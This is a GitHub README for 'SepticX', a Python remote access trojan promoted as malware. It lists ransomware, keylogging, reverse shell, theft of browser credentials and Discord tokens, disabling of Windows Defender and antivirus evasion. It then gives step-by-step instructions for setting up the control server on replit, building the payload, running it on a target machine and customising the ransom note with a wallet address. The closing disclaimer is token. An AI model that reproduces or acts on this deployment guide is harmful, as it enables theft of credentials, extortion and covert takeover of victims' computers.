# SepticX 🐀

An advanced python Rat Client capable of many malicious tasks

![image](https://github.com/TheonlyIcebear/SepticX/assets/78031685/f450d92d-a3d4-4117-a3b6-81c40dd09825)

![image](https://github.com/user-attachments/assets/62f919b1-b974-42d2-abe6-dfb6e56e1c4a)

![image](https://github.com/TheonlyIcebear/SepticX/assets/78031685/191cc65e-0fa4-4946-a62f-6782ef6fa1c1)

![image](https://github.com/TheonlyIcebear/SepticX/assets/78031685/37aebb7b-fb65-4ffe-ac57-45a2515fd473)



# Features

This tool is able to do all of these tasks, all at once

 - Completely FUD
 - Add's to startup
 - Trollware
 - Ransomware
 - File Manager
 - Auto Spread through discord
 - KeyLogging
 - Reverse Shell (License Required)
 - Spyware accessing, camera, microphone, and screen display (License Required)
 - Disable CMD, Registry Editor, TaskMGR, as well as all of the Power buttons including, shut off, restart and sleep
 - Disables Windows Defender
 - Undetected by Windows Defender
 - UAC Bypass
 - Blocks AV sites
 - Incredibly Accurate VM Detection
 - Bypasses VirusTotal
 - Grabs all Browser credentials, including, Passwords, Cookies, Browser History, and Payment Methods
 - Constantly searches for processes like `Process Hacker` or `Wire Shark` and closes them immediately
 - Grabs Discord tokens, and Roblox cookies

https://www.virustotal.com/gui/file/f0000196e13bf8c69cb7991eeb9e231184de3daa13a6cc463d940d103fc4e0fb/detection <br>
![image](https://github.com/TheonlyIcebear/SepticX/assets/78031685/e9782a60-d1da-43b4-89dc-c9b76cf2ec43)


# Setup


Setup can be done pretty quickly!<br>
 - Upload the contents of the server folder into replit
 - delete `main.py` and remame `server.py` to `main.py`

 - Copy and paste example.json into the replit secret manager to set the `ENV` variables, Remember to replace the env variables with your own information
    - For the `key` variable go to [this link](https://emn178.github.io/online-tools/sha256.html) and input whatever password you want, copy the output then set the `ENV` variable to the output from the site 
    
        - This is the same key you will use when building the rat

    - For `t` replace it with your a discord token, so it can dynamically generate webhooks

    - `webhook_generation_logs` is the channel where the log of all webhooks being generated will go and `backup_webhook` is a backup webhook incase it fails to create a webhook

    - The `channel_id` and `channel_id2` are the discord channels where the webhooks will be generated, set them to two different channels in case something happens to the first channel

 - Once you've setup your replit, run compiler.py, and either put your config inside config.json and use that or type in your config manually

- Inside your replit replace output.exe with the stub you created with compiler.py, and logger.exe with whatever file you want, like a crypto miner for example

 - Then run it on a target machine and it should connect

 - To see your keylogs check the logs folder on the replit, everything else will be sent to your discord webhook and finally run `controller.py` to control any connected clients

![image](https://github.com/TheonlyIcebear/SepticX/assets/78031685/8a74f54f-3f74-4f78-8a4a-bbcb5648611f)


[Full tutorial here](https://www.veed.io/view/051c67a5-13a0-46bd-869f-1709f72eed36?panel=share)


### Extra

If you go into the `src\files` directory you'll find some files that the Rat load will put onto their pc when the Ransomware runs

If you want you can change wallpaper.jpg and annoy.mp3 to whatever you want. Just keep the filenames the same

For Instructions.txt you can also change it to whatever you want but, if you want instead of putting your wallet address and the amount of money into the file you can use `WALLET` and `AMOUNT` and the program will automatically replace them

# Getting a License

This is only the Open Source version of the client, if you'd like to gain access to the more advanced features like, better obfuscation go to the Offical [Discord Server](https://discord.gg/3xh6ku7HxX)

# Support
If you you'd like to report any bugs or ask for support go to my [Discord Server](https://discord.gg/3xh6ku7HxX)

# Disclaimer

Do not use this tool to remotely access anyone's computer without their consent, for that is illegal by federal law.
